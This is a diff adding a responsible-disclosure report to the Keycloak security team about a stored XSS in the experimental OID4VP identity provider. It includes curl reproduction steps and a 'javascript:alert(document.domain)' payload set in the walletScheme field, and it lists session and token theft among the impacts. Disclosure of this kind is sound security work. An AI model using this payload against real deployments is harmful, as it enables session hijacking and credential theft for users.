@@ -1,0 +1,94 @@
+Hi Keycloak Security Team,
+
+I am reporting a stored XSS vulnerability in the experimental OID4VP Identity
+Provider feature. I understand experimental features may not receive a CVE,
+but I am reporting it per your policy guidance to let you assess.
+
+Affected Version: Latest main branch (commit 3c07b879d5cfaf277caa5d4bc96174347f71f91c)
+Tested on: Keycloak 999.0.0-SNAPSHOT built from source
+Feature flag: oid4vc-vp (experimental)
+
+AI Disclosure: AI tools were used to assist in drafting this report. The
+vulnerability was manually discovered, verified, and reproduced.
+
+DESCRIPTION:
+The OID4VP Identity Provider accepts arbitrary URI schemes in the walletScheme
+configuration, including javascript:. This value is rendered as an href in the
+login page without sanitization. When a user clicks the wallet button, arbitrary
+JavaScript executes in the Keycloak domain context.
+
+ROOT CAUSE:
+OID4VPIdentityProvider.java lines 254-259 — the walletScheme config is passed
+directly into the redirect URI with no scheme validation or allowlist.
+
+REPRODUCTION STEPS:
+
+1. Start Keycloak with experimental OID4VP feature:
+
+JAVA_HOME=/usr/lib/jvm/java-17-openjdk-amd64 \
+KC_BOOTSTRAP_ADMIN_USERNAME=admin KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
+bin/kc.sh start-dev --http-port=8084 --features=oid4vc-vci,oid4vc-vp,preview
+
+2. Get admin token:
+
+KC=http://localhost:8084
+tok() {
+  curl -s $KC/realms/master/protocol/openid-connect/token \
+    -d client_id=admin-cli -d username=admin -d password=admin \
+    -d grant_type=password \
+    | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])'
+}
+T=$(tok)
+
+3. Create malicious OID4VP Identity Provider:
+
+curl -s -X POST $KC/admin/realms/master/identity-provider/instances \
+  -H "Authorization: Bearer $T" \
+  -H 'Content-Type: application/json' \
+  -d '{
+    "alias":"oid4vp-poc",
+    "providerId":"oid4vp",
+    "enabled":true,
+    "config":{
+      "walletScheme":"javascript:alert(document.domain)//",
+      "trustedIssuerJwks":"https://example.com"
+    }
+  }'
+
+4. Generate login URL and open in browser:
+
+CHALLENGE=$(echo -n "testverifier123456789012345678901234567890123" \
+  | openssl dgst -sha256 -binary | openssl base64 -A \
+  | tr '+/' '-_' | tr -d '=')
+
+Open in browser:
+http://localhost:8084/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost%3A8084%2Frealms%2Fmaster%2Faccount&kc_idp_hint=oid4vp-poc&code_challenge=$CHALLENGE&code_challenge_method=S256&nonce=test123&state=test456
+
+5. Verify via curl:
+
+curl -s -L -c /tmp/kc-cookies -b /tmp/kc-cookies \
+  "http://localhost:8084/realms/master/protocol/openid-connect/auth?client_id=account-console&response_type=code&scope=openid&redirect_uri=http%3A%2F%2Flocalhost%3A8084%2Frealms%2Fmaster%2Faccount&kc_idp_hint=oid4vp-poc&code_challenge=$CHALLENGE&code_challenge_method=S256&nonce=test123&state=test456" \
+  | grep -o 'javascript:[^"]*'
+
+Output: javascript:alert(document.domain)//://? ...
+
+6. In browser: page shows "Sign in with your wallet" with QR code.
+   Click the wallet button — alert() fires showing "localhost:8084",
+   confirming JavaScript execution in Keycloak's origin.
+
+IMPACT:
+- Session hijacking (steal KEYCLOAK_SESSION cookie)
+- Token theft
+- Credential harvesting via injected fake login form
+- Requires admin access to set walletScheme, but affects all realm users
+
+Note: Although this requires admin privileges to configure, it violates the
+principle of least privilege — an admin should be able to configure an IdP
+without gaining the ability to execute JavaScript in users' browsers.
+
+CVSS 3.1: 6.1 (Medium)
+Vector: AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N
+
+Credit: Muhannad Alsaif
+Contact: Mohnadalsaif1@gmail.com
+GitHub: Mohnad-AL-saif
